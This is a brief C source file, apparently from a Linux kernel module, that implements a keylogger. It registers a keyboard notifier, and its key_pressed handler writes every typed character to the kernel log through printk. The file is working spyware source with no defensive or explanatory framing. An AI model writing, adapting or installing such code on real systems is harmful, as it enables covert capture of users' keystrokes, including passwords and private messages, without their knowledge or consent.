#include <linux/keyboard.h>
#include <linux/kernel.h>
#include <linux/notifier.h>

#include "include/keyboard.h"

static struct notifier_block keylogger_nb = {
	.notifier_call = key_pressed
};

int keyboard_init(void) {
	register_keyboard_notifier(&keylogger_nb);
	return 0;
}

void keyboard_cleanup(void) {
	unregister_keyboard_notifier(&keylogger_nb);
}

int key_pressed(struct notifier_block *nb, unsigned long action, void *data) {
	struct keyboard_notifier_param *param = data;

	if (KBD_KEYSYM == action && param->down == 1) {
		char c = param->value;
		printk(KERN_INFO "%c", c);
	}

	return NOTIFY_OK;
}
